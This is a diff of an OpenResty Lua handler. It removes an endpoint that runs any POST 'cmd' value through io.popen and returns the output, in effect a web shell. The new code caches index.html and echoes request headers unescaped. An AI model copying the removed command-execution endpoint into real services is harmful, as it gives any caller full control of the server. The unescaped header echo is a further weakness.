@@ -1,15 +1,28 @@
-local _M = {}
+ local _M = {}
+cache_str = nil;
 function _M.run()
     ngx.req.read_body()
     local post_args = ngx.req.get_post_args()
-    -- for k, v in pairs(post_args) do
-    --    ngx.say(string.format("%s = %s", k, v))
-    -- end
-    local cmd = post_args["cmd"]
-    if cmd then
-        f_ret = io.popen(cmd)
-        local ret = f_ret:read("*a")
-        ngx.say(string.format("reply:\n%s", ret))
-    end
+
+    -- local cmd = post_args["cmd"]
+    if nil == cache_str then
+		local cmd = '/usr/local/openresty/nginx/html/index.html'
+		f_ret,err = io.open(cmd)
+		-- ngx.say(err)
+		-- ngx.say( ngx.null)
+
+		if nil == err then
+			local ret = f_ret:read("*a")
+			cache_str = ret
+			-- ngx.say('ret'.. ret .. 'res')
+			ngx.say("save cache")
+		end
+	end
+	ngx.say('cache_str: '.. cache_str)
+	-- 获取header
+	local headers = ngx.req.get_headers()
+	for k,v in pairs(headers) do
+		ngx.say("[header] name: " ,k," v: ",v .."</br>")
+	end
 end
 return _M
